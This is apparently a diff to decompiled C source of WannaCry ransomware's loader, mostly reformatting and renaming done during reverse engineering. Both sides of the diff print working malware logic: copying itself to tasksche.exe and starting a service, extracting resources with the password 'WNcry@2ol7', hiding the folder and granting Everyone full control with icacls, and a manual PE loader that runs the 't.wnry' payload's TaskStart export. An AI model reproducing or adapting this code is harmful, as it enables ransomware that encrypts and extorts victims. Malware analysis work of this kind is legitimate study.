-  argc = (int *)__p___argc();
-  
-  if (*argc == 2) {
-	_s__i = s__i_0040f538;
-	argv = (char ***)__p___argv();
+	memset(puVar5, 0, arg1_cmp);
+
+	*(undefined2 *)puVar5 = 0;
+	*(undefined *)((int)puVar5 + 2) = 0;
+	GetModuleFileNameA(NULL,filename,520);
+	randomstring_generator((char *)&randomstring);
+
+	argc = (int *)__p___argc();
+
+	if (*argc == 2) {
+		slash_i = "/i";
+		argv = (char ***)__p___argv();
+
+		strcmp(argv[i], "/i");
+
+		if ((arg1_cmp == 0) && (uVar1 = create_and_cwd_random_hidden_directory((wchar_t *)0x0), uVar1 != 0)) {
+			CopyFileA(filename, "tasksche.exe", 0);
+			DVar2 = GetFileAttributesA("tasksche.exe");
+			
+			if ((DVar2 != 0xffffffff) && (arg1_cmp = create_or_start_taskche_service(), arg1_cmp != 0)) {
+				return 0;
+			}
+		}
+	}
+
+	slash_i = strrchr(filename,0x5c);
+
+	if (slash_i != NULL) {
+		slash_i = strrchr(filename,0x5c);
+		*slash_i = '\0';
+	}
+
+	SetCurrentDirectoryA(filename);
+	set_or_query_registry_cwd(1);
+	FUN_00401dab(NULL, "WNcry@2ol7");
+	bitcoin_something();
+	run_command("attrib +h .", 0, NULL);
+	run_command("icacls . /grant Everyone:F /T /C /Q", 0, NULL);
+	arg1_cmp = FUN_0040170a();
 	
-	strcmp(argv[i], "/i");
-
-	if ((arg1_cmp == 0) &&
-	   (uVar1 = create_and_cwd_random_hidden_directory((wchar_t *)0x0), uVar1 != 0)) {
-	  CopyFileA(filename, "tasksche.exe", 0);
-	  DVar2 = GetFileAttributesA("tasksche.exe");
-	  
-	  if ((DVar2 != 0xffffffff) && (arg1_cmp = create_or_start_taskche_service(), arg1_cmp != 0)) {
-		return 0;
-	  }
-	}
-  }
-  
-  _s__i = strrchr(filename,0x5c);
-  
-  if (_s__i != (char *)0x0) {
-	_s__i = strrchr(filename,0x5c);
-	*_s__i = '\0';
-  }
-  
-  SetCurrentDirectoryA(filename);
-  set_or_query_registry_cwd(1);
-  FUN_00401dab(NULL, "WNcry@2ol7");
-  bitcoin_something();
-  run_command("attrib +h .", 0, NULL);
-  run_command("icacls . /grant Everyone:F /T /C /Q", 0, NULL);
-  arg1_cmp = FUN_0040170a();
-  if (arg1_cmp != 0) {
-	FUN_004012fd();
-	arg1_cmp = FUN_00401437(local_6e8,NULL,0,0);
 	if (arg1_cmp != 0) {
-	  local_8 = 0;
-	  psVar3 = (short *)FUN_004014a6(local_6e8,"t.wnry",&local_8);
-	  if (((psVar3 != (short *)0x0) &&
-		  (argc = (int *)FUN_004021bd(psVar3,local_8), argc != (int *)0x0)) &&
-		 (pcVar4 = (code *)FUN_00402924(argc,s_TaskStart_0040f4e8), pcVar4 != (code *)0x0)) {
-		(*pcVar4)(0,0);
-	  }
+		FUN_004012fd();
+		arg1_cmp = FUN_00401437(local_6e8,NULL,0,0);
+		if (arg1_cmp != 0) {
+			local_8 = 0;
+			psVar3 = (short *)FUN_004014a6(local_6e8,"t.wnry",&local_8);
+			if (((psVar3 != NULL) && (argc = (int *)FUN_004021bd(psVar3,local_8), argc != NULL)) && (pcVar4 = (code *)FUN_00402924(argc,"TaskStart"), pcVar4 != NULL) {
+				(*pcVar4)(0,0);
+			}
+		}
+		FUN_0040137a();
 	}
-	FUN_0040137a();
-  }
-  return 0;
+	return 0;
 }
 
 void FUN_004021bd(short *param_1,uint param_2) {
-  FUN_004021e9(param_1,param_2,&LAB_0040216e,&LAB_00402185,(uint)&LAB_00402198,&LAB_004021a3,
-			   (uint)&LAB_004021b2,0);
-  return;
+	FUN_004021e9(param_1,param_2,&LAB_0040216e,&LAB_00402185,(uint)&LAB_00402198,&LAB_004021a3,(uint)&LAB_004021b2,0);
+	return;
 }
 
-uint * __cdecl
-FUN_004021e9(short *param_1,uint param_2,undefined *param_3,undefined *param_4,uint param_5,
-			undefined *param_6,uint param_7,uint param_8) {
-  int iVar1;
-  HMODULE pHVar2;
-  code *pcVar3;
-  uint uVar4;
-  HANDLE hHeap;
-  uint *puVar5;
-  void *_Dst;
-  int *piVar6;
-  uint uVar7;
-  int *piVar8;
-  DWORD dwFlags;
-  SIZE_T dwBytes;
-  undefined local_2c [4];
-  uint local_28;
-  uint local_8;
-  
-  local_8 = 0;
-  iVar1 = FUN_00402457(param_2,0x40);
-  if (iVar1 == 0) {
-	return (uint *)0x0;
-  }
-  if (*param_1 == 0x5a4d) {
-	iVar1 = FUN_00402457(param_2,*(int *)(param_1 + 0x1e) + 0xf8);
+uint * FUN_004021e9(short *param_1,uint param_2,undefined *param_3,undefined *param_4,uint param_5,undefined *param_6,uint param_7,uint param_8) {
+	int iVar1;
+	HMODULE pHVar2;
+	code *pcVar3;
+	uint uVar4;
+	HANDLE hHeap;
+	uint *puVar5;
+	void *_Dst;
+	int *piVar6;
+	uint uVar7;
+	int *piVar8;
+	DWORD dwFlags;
+	SIZE_T dwBytes;
+	undefined local_2c [4];
+	uint local_28;
+	uint local_8;
+
+	local_8 = 0;
+	iVar1 = FUN_00402457(param_2,0x40);
+	
 	if (iVar1 == 0) {
-	  return (uint *)0x0;
+		return NULL;
 	}
-	piVar8 = (int *)(*(int *)(param_1 + 0x1e) + (int)param_1);
-	if (((*piVar8 == 0x4550) && (*(short *)(piVar8 + 1) == 0x14c)) && ((piVar8[0xe] & 1U) == 0)) {
-	  uVar7 = (uint)*(ushort *)((int)piVar8 + 6);
-	  if (*(ushort *)((int)piVar8 + 6) != 0) {
-		piVar6 = (int *)((int)piVar8 + (uint)*(ushort *)(piVar8 + 5) + 0x24);
-		do {
-		  uVar4 = piVar6[1];
-		  if (uVar4 == 0) {
-			uVar4 = piVar8[0xe];
-		  }
-		  if (local_8 < *piVar6 + uVar4) {
-			local_8 = *piVar6 + uVar4;
-		  }
-		  piVar6 = piVar6 + 10;
-		  uVar7 = uVar7 - 1;
-		} while (uVar7 != 0);
-	  }
-	  pHVar2 = GetModuleHandleA(s_kernel32_dll_0040ebe8);
-	  if (pHVar2 == (HMODULE)0x0) {
-		return (uint *)0x0;
-	  }
-	  pcVar3 = (code *)(*(code *)param_6)(pHVar2,s_GetNativeSystemInfo_0040f55c,0);
-	  if (pcVar3 == (code *)0x0) {
-		return (uint *)0x0;
-	  }
-	  (*pcVar3)(local_2c);
-	  uVar7 = piVar8[0x14] + -1 + local_28 & ~(local_28 - 1);
-	  if (uVar7 == ((local_28 - 1) + local_8 & ~(local_28 - 1))) {
-		uVar4 = (*(code *)param_3)(piVar8[0xd],uVar7,0x3000,4,param_8);
-		if ((uVar4 != 0) || (uVar4 = (*(code *)param_3)(0,uVar7,0x3000,4,param_8), uVar4 != 0)) {
-		  dwBytes = 0x3c;
-		  dwFlags = 8;
-		  hHeap = GetProcessHeap();
-		  puVar5 = (uint *)HeapAlloc(hHeap,dwFlags,dwBytes);
-		  if (puVar5 != (uint *)0x0) {
-			puVar5[1] = uVar4;
-			puVar5[5] = ((uint)*(ushort *)((int)piVar8 + 0x16) & 0x2000) >> 0xd;
-			*(undefined **)(puVar5 + 7) = param_3;
-			*(undefined **)(puVar5 + 8) = param_4;
-			puVar5[9] = param_5;
-			*(undefined **)(puVar5 + 10) = param_6;
-			puVar5[0xb] = param_7;
-			puVar5[0xc] = param_8;
-			puVar5[0xe] = local_28;
-			iVar1 = FUN_00402457(param_2,piVar8[0x15]);
-			if (iVar1 != 0) {
-			  _Dst = (void *)(*(code *)param_3)(uVar4,piVar8[0x15],0x1000,4,param_8);
-			  memcpy(_Dst,param_1,piVar8[0x15]);
-			  iVar1 = *(int *)(param_1 + 0x1e);
-			  *puVar5 = iVar1 + (int)_Dst;
-			  *(uint *)(iVar1 + (int)_Dst + 0x34) = uVar4;
-			  iVar1 = FUN_00402470((int)param_1,param_2,(int)piVar8,(int *)puVar5);
-			  if (iVar1 != 0) {
-				iVar1 = *(int *)(*puVar5 + 0x34) - piVar8[0xd];
-				if (iVar1 == 0) {
-				  puVar5[6] = 1;
-				}
-				else {
-				  uVar7 = FUN_00402758((int *)puVar5,iVar1);
-				  puVar5[6] = uVar7;
-				}
-				iVar1 = FUN_004027df(puVar5);
-				if (((iVar1 != 0) && (uVar7 = FUN_0040254b((int *)puVar5), uVar7 != 0)) &&
-				   (iVar1 = FUN_0040271d((int *)puVar5), iVar1 != 0)) {
-				  iVar1 = *(int *)(*puVar5 + 0x28);
-				  if (iVar1 == 0) {
-					puVar5[0xd] = 0;
-					return puVar5;
-				  }
-				  if (puVar5[5] == 0) {
-					puVar5[0xd] = iVar1 + uVar4;
-					return puVar5;
-				  }
-				  iVar1 = (*(code *)(iVar1 + uVar4))(uVar4,1,0);
-				  if (iVar1 != 0) {
-					puVar5[4] = 1;
-					return puVar5;
-				  }
-				  SetLastError(0x45a);
-				}
-			  }
-			}
-			FUN_004029cc((int *)puVar5);
-			return (uint *)0x0;
-		  }
-		  (*(code *)param_4)(uVar4,0,0x8000,param_8);
+	
+	if (*param_1 == 0x5a4d) {
+		iVar1 = FUN_00402457(param_2,*(int *)(param_1 + 0x1e) + 0xf8);
+		
+		if (iVar1 == 0) {
+			return NULL;
 		}
-		dwFlags = 0xe;
-		goto LAB_00402219;
-	  }
+		
+		piVar8 = (int *)(*(int *)(param_1 + 0x1e) + (int)param_1);
+		
+		if (((*piVar8 == 0x4550) && (*(short *)(piVar8 + 1) == 0x14c)) && ((piVar8[0xe] & 1U) == 0)) {
+			uVar7 = (uint)*(ushort *)((int)piVar8 + 6);
+			if (*(ushort *)((int)piVar8 + 6) != 0) {
+				piVar6 = (int *)((int)piVar8 + (uint)*(ushort *)(piVar8 + 5) + 0x24);
+				do {
+					uVar4 = piVar6[1];
+			
+					if (uVar4 == 0) {
+						uVar4 = piVar8[0xe];
+					}
+			
+					if (local_8 < *piVar6 + uVar4) {
+						local_8 = *piVar6 + uVar4;
+					}
+			
+					piVar6 = piVar6 + 10;
+					uVar7 = uVar7 - 1;
+				} while (uVar7 != 0);
+			}
+			
+			pHVar2 = GetModuleHandleA("kernel32.dll");
+			
+			if (pHVar2 == NULL) {
+				return NULL;
+			}
+
+			pcVar3 = (code *)(*(code *)param_6)(pHVar2,"GetNativeSystemInfo",0);
+			
+			if (pcVar3 == NULL) {
+				return NULL;
+			}
+			
+			(*pcVar3)(local_2c);
+			uVar7 = piVar8[0x14] + -1 + local_28 & ~(local_28 - 1);
+			
+			if (uVar7 == ((local_28 - 1) + local_8 & ~(local_28 - 1))) {
+				uVar4 = (*(code *)param_3)(piVar8[0xd],uVar7,0x3000,4,param_8);
+				if ((uVar4 != 0) || (uVar4 = (*(code *)param_3)(0,uVar7,0x3000,4,param_8), uVar4 != 0)) {
+					dwBytes = 0x3c;
+					dwFlags = 8;
+					hHeap = GetProcessHeap();
+					puVar5 = (uint *)HeapAlloc(hHeap,dwFlags,dwBytes);
+					if (puVar5 != NULL) {
+						puVar5[1] = uVar4;
+						puVar5[5] = ((uint)*(ushort *)((int)piVar8 + 0x16) & 0x2000) >> 0xd;
+						*(undefined **)(puVar5 + 7) = param_3;
+						*(undefined **)(puVar5 + 8) = param_4;
+						puVar5[9] = param_5;
+						*(undefined **)(puVar5 + 10) = param_6;
+						puVar5[0xb] = param_7;
+						puVar5[0xc] = param_8;
+						puVar5[0xe] = local_28;
+						iVar1 = FUN_00402457(param_2,piVar8[0x15]);
+					
+						if (iVar1 != 0) {
+							_Dst = (void *)(*(code *)param_3)(uVar4,piVar8[0x15],0x1000,4,param_8);
+							memcpy(_Dst,param_1,piVar8[0x15]);
+							iVar1 = *(int *)(param_1 + 0x1e);
+							*puVar5 = iVar1 + (int)_Dst;
+							*(uint *)(iVar1 + (int)_Dst + 0x34) = uVar4;
+							iVar1 = FUN_00402470((int)param_1,param_2,(int)piVar8,(int *)puVar5);
+					
+							if (iVar1 != 0) {
+								iVar1 = *(int *)(*puVar5 + 0x34) - piVar8[0xd];
+						
+								if (iVar1 == 0) {
+									puVar5[6] = 1;
+								} else {
+									uVar7 = FUN_00402758((int *)puVar5,iVar1);
+									puVar5[6] = uVar7;
+								}
+						
+								iVar1 = FUN_004027df(puVar5);
+						
+								if (((iVar1 != 0) && (uVar7 = FUN_0040254b((int *)puVar5), uVar7 != 0)) && (iVar1 = FUN_0040271d((int *)puVar5), iVar1 != 0)) {
+									iVar1 = *(int *)(*puVar5 + 0x28);
+									if (iVar1 == 0) {
+										puVar5[0xd] = 0;
+										return puVar5;
+									}
+								
+									if (puVar5[5] == 0) {
+										puVar5[0xd] = iVar1 + uVar4;
+										return puVar5;
+									}
+								
+									iVar1 = (*(code *)(iVar1 + uVar4))(uVar4,1,0);
+								
+									if (iVar1 != 0) {
+										puVar5[4] = 1;
+										return puVar5;
+									}
+									
+									SetLastError(0x45a);
+								}
+							}
+						}
+						FUN_004029cc((int *)puVar5);
+						return NULL;
+					}
+					
+					(*(code *)param_4)(uVar4,0,0x8000,param_8);
+				}
+				
+				dwFlags = 0xe;
+				goto LAB_00402219;
+			}
+		}
 	}
-  }
-  dwFlags = 0xc1;
-LAB_00402219:
-  SetLastError(dwFlags);
-  return (uint *)0x0;
+	dwFlags = 0xc1;
+	LAB_00402219:
+	SetLastError(dwFlags);
+	return NULL;
 }
 
 undefined4 FUN_00402457(uint param_1,uint param_2) {
-  if (param_1 < param_2) {
-	SetLastError(0xd);
-	return 0;
-  }
-  return 1;
+	if (param_1 < param_2) {
+		SetLastError(0xd);
+		return 0;
+	}
+	return 1;
 }
 
 undefined4 FUN_00402470(int param_1,uint param_2,int param_3,int *param_4) {
@@ -5125,7 +5113,7 @@ LAB_00405fc0:
   return -1;
 }
 
-char ** unzip_something(char *param_1) {
+char ** FUN_00405fe2(char *param_1) {
   int iVar1;
   char **ppcVar2;
   char **ppcVar3;
